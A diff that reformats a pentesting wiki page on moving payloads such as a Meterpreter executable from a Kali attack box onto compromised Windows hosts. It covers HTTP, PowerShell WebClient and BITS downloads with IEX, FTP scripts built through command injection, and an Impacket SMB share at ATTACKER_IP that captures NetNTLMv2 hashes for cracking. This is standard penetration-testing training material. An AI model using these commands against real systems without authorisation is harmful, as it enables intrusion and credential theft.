@@ -1,6 +1,6 @@
-# Transfiriendo datos \(traducir\)
+# Transfiriendo datos (traducir)
 
-## Transfiriendo datos \(traducir\)
+## Transfiriendo datos (traducir)
 
 Often times on an engagement I find myself needing to copy a tool or a payload from my Kali linux attack box to a compromised Windows machine.
 
@@ -20,8 +20,8 @@ The two ways I usually serve a file over HTTP from Kali are either through Apach
 
 To serve a file up over Apache, just simply copy it to /var/www/html and enable the Apache service. Apache is installed by default in Kali:
 
-`cp met8888.exe /var/www/html    
-service apache2 start`
+`cp met8888.exe /var/www/html`  \
+`service apache2 start`
 
 **PYTHON**
 
@@ -37,7 +37,7 @@ python http.server\`
 
 If you have desktop access, simply browse to `http://YOUR-KALI-IP/shell8888.exe` and use the browser to download the file.
 
-If you only have command line access \(e.g. through a shell\), downloading via HTTP is a little trickier as there’s no built-in Windows equivalent to `curl` or `wget`. The best option is to use PowerShell’s WebClient object:
+If you only have command line access (e.g. through a shell), downloading via HTTP is a little trickier as there’s no built-in Windows equivalent to `curl` or `wget`. The best option is to use PowerShell’s WebClient object:
 
 `Powershell (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')`
 
@@ -63,7 +63,7 @@ One benefit of using FTP over HTTP is the ability to transfer files both way. If
 
 As mentioned earlier, Windows has an FTP client built in to the PATH. You can open an FTP connection and download the files directly from Kali on the command line. Authenticate with user `anonymous` and any password
 
-```text
+```
 ftp 10.10.14.160
 anonymous #user asked
 (en blanco) #password asked
@@ -74,10 +74,10 @@ get binario.exe #to receibe binary
 bye
 ```
 
-Now this is great if you have an interactive shell where you can actually drop into the FTP prompt and issue commands, but it’s not that useful if you just have command injection and can only issue one command at a time.  
+Now this is great if you have an interactive shell where you can actually drop into the FTP prompt and issue commands, but it’s not that useful if you just have command injection and can only issue one command at a time.\
 Fortunately, windows FTP can take a “script” of commands directly from the command line. Which means if we have a text file on the system that contains this:
 
-```text
+```
 #script for ftp
 open 10.9.122.8
 anonymous
@@ -91,13 +91,13 @@ ftp -s:ftp_commands.txt
 
 How to get that text file? We can echo into it one line at at time:
 
-C:\Users\jarrieta\Desktop&gt;echo open 10.9.122.8&gt;ftp\_commands.txt  
-C:\Users\jarrieta\Desktop&gt;echo anonymous&gt;&gt;ftp\_commands.txt  
-C:\Users\jarrieta\Desktop&gt;echo whatever&gt;&gt;ftp\_commands.txt  
-C:\Users\jarrieta\Desktop&gt;echo binary&gt;&gt;ftp\_commands.txt  
-C:\Users\jarrieta\Desktop&gt;echo get met8888.exe&gt;&gt;ftp\_commands.txt  
-C:\Users\jarrieta\Desktop&gt;echo bye&gt;&gt;ftp\_commands.txt  
-C:\Users\jarrieta\Desktop&gt;ftp -s:ftp\_commands.txt
+C:\Users\jarrieta\Desktop>echo open 10.9.122.8>ftp\_commands.txt\
+C:\Users\jarrieta\Desktop>echo anonymous>>ftp\_commands.txt\
+C:\Users\jarrieta\Desktop>echo whatever>>ftp\_commands.txt\
+C:\Users\jarrieta\Desktop>echo binary>>ftp\_commands.txt\
+C:\Users\jarrieta\Desktop>echo get met8888.exe>>ftp\_commands.txt\
+C:\Users\jarrieta\Desktop>echo bye>>ftp\_commands.txt\
+C:\Users\jarrieta\Desktop>ftp -s:ftp\_commands.txt
 
 or in oneliner.
 
@@ -135,10 +135,10 @@ This is actually my favorite method to transfer a file to a Windows host. SMB is
 
 Trying to get Samba set up and configured properly on Linux is a pain. You have to configure authentication, permissions, etc and it’s quite frankly way overkill if I just want to download one file. Now Samba an actually do some [really](http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html) [cool](http://passing-the-hash.blogspot.com/2016/06/im-pkdc-your-personal-kerberos-domain.html) stuff when you configure it to play nicely with Windows AD, but most of the time I just want a super simple server up and running that accepts any authentication and serves up or accepts files.
 
-Enter `smbserver.py`, part of the [Impacket](https://github.com/CoreSecurity/impacket) project. Maybe one day I’ll write a blogpost without mentioning Impacket, but that day is not today.  
+Enter `smbserver.py`, part of the [Impacket](https://github.com/CoreSecurity/impacket) project. Maybe one day I’ll write a blogpost without mentioning Impacket, but that day is not today.\
 To launch a simple SMB server on port 445, just specify a share name and the path you want to share:
 
-```text
+```
 #Older versions of Parrot
 python smbserver.py -smb2support ROPNOP /root/shells
 
@@ -154,10 +154,10 @@ In one line we’ve got an SMB share up and running. You can confirm it with `sm
 
 Since Windows handles UNC paths, you can just treat the `ROPNOP` share as if it's just a local folder from Windows. Basic Windows file commands like `dir`, `copy`, `move`, etc all just work:
 
-`dir \\ATTACKER_IP\root\shells    
-copy \\ATTACKER_IP\root\shells\met8888.exe`
+`dir \\ATTACKER_IP\root\shells`  \
+`copy \\ATTACKER_IP\root\shells\met8888.exe`
 
-If you look at the output from `smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want \(assuming you canâ€™t just elevate to System and get them from Mimikatz\)
+If you look at the output from `smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want (assuming you canâ€™t just elevate to System and get them from Mimikatz)
 
 #### **Executing files from SMB**
 
@@ -179,7 +179,7 @@ The first and most obvious option is the Invoke-WebRequest cmdlet. It is built i
 
 **Pros**
 
-With the cmdlet already available it is super easy to get started and use. Integration with Write-Progress is handy while watching paint dry scripts run \(assuming you know the total file size\). Cookies can also be persisted between mutiple requests through the use of the **-Session** and **-WebSession** parameters.
+With the cmdlet already available it is super easy to get started and use. Integration with Write-Progress is handy while watching paint dry scripts run (assuming you know the total file size). Cookies can also be persisted between mutiple requests through the use of the **-Session** and **-WebSession** parameters.
 
 **Cons**
 
@@ -197,18 +197,18 @@ A common .NET class used for downloading files is the [System.Net.WebClient](htt
 
 This method is also easy to use. Not as syntactically nice as Invoke-RestMethod - yet can still be executed on a single line. Speed is great as the HTTP response stream is buffered to disk throughout the download process.
 
-There is also the option of **System.Net.WebClient.DownloadFileAsync\(\)**. This can be very handy if you'd like your script to continue while the file downloads in parallel.
+There is also the option of **System.Net.WebClient.DownloadFileAsync()**. This can be very handy if you'd like your script to continue while the file downloads in parallel.
 
 **Cons**
 
-There is no visible progress indicator \(or any way to query the progress mid transfer\). It essentially blocks the thread until the download completes or fails. This isn't a major con, however sometimes it is handy to know how far through the transfer you are.
+There is no visible progress indicator (or any way to query the progress mid transfer). It essentially blocks the thread until the download completes or fails. This isn't a major con, however sometimes it is handy to know how far through the transfer you are.
 
 #### **3. Start-BitsTransfer**
 
-If you haven't heard of BITS before, [check this out](https://msdn.microsoft.com/en-us/library/aa362708.aspx). BITS is primarily designed for asynchronous file downloads, but works perfectly fine synchronously too \(assuming you have BITS enabled\).
+If you haven't heard of BITS before, [check this out](https://msdn.microsoft.com/en-us/library/aa362708.aspx). BITS is primarily designed for asynchronous file downloads, but works perfectly fine synchronously too (assuming you have BITS enabled).
 
-`Import-Module BitsTransfer    
-IEX(Start-BitsTransfer -Source $url -Destination $output)`
+`Import-Module BitsTransfer`  \
+`IEX(Start-BitsTransfer -Source $url -Destination $output)`
 
 **Pros**
 
@@ -218,5 +218,4 @@ Personally, the biggest benefit to using the Start-BitsTransfer method is the ab
 
 **Cons**
 
-While BITS is enabled by default on many machines, you can't guarantee it is enabled on all \(unless you are actively managing this\). Also with the way BITS is designed, if other BITS jobs are running in the background, your job could be queued or run at a later time hindering the execution of your script.
-
+While BITS is enabled by default on many machines, you can't guarantee it is enabled on all (unless you are actively managing this). Also with the way BITS is designed, if other BITS jobs are running in the background, your job could be queued or run at a later time hindering the execution of your script.
